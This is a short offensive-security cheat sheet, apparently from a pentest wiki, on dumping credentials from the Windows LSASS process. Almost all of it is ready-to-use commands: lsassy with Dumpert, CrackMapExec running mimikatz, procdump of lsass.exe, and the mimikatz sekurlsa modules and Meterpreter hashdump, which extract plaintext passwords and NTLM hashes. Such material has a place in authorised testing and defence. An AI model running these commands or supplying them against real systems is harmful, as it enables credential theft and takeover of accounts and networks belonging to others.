---
description: Local Security Authority Subsystem Service
---

# LSASS

## Theory

LSASS process stores credentials in its memory. With admin rights these crendentials can be dumped.

## Method

### LSASSY

#### [https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)

#### Using Dumpert

```bash
lsassy -d "<dom>" -u "<user>" -p "<pwd>" <ip> -m 5 --dumpert /home/user/Bureau/od.exe
```

### CrackMapExec

#### Using LSASSY

#### Using Mimikatz

```bash
crackmapexec smb <ip> '<user>' -p '<pwd' -d <dom> --mimikatz-cmd "sekurlsa::logonPasswords full"
```

#### Procdump

```bash
procdump.exe -accepteula -ma lsass.exe <file>
```

* The dump output file needs to be openend with `Mimikatz` from a Windows workstation or virtual machine compatible (version and architecture) with the targeted workstation.
* Switch in the LSASS context of the dumped file

`sekurlsa::minidump <DUMP_FILE>`

#### Mimikatz

* Enumerate all possible credentials

`sekurlsa::logonPasswords full`

* Clear text password (Windows < 8.1)

`sekurlsa::wdigest` or `sekurlsa::credman`

* LM & NTLM hashes

`sekurlsa::msv`

#### Meterpreter

* Dump local SAM database

`hashdump`

* Use mimikatz

`load mimikatz`&#x20;

`mimikatz_command -f sekurlsa::logonPasswords full`
